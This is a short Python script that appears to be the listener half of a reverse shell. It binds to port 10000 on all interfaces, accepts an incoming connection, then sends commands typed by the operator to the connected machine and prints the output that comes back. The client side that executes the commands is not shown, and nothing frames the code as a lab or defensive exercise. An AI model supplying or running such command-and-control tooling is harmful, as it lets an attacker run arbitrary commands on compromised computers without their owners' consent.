import socket

sock = socket.socket()

host = "0.0.0.0"
port = 10000

sock.bind((host, port))
sock.listen(2)
print(f"Listening as {host}:{port}...")
client_socket, client_address = sock.accept()

print(f"{client_address[0]}:{client_address[1]} Connected!")
client_socket.send("ambata blow".encode())

while True:
    command = input("the blowing:\n")
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    results = client_socket.recv(1024).decode()
    print(results)
client_socket.close()
sock.close()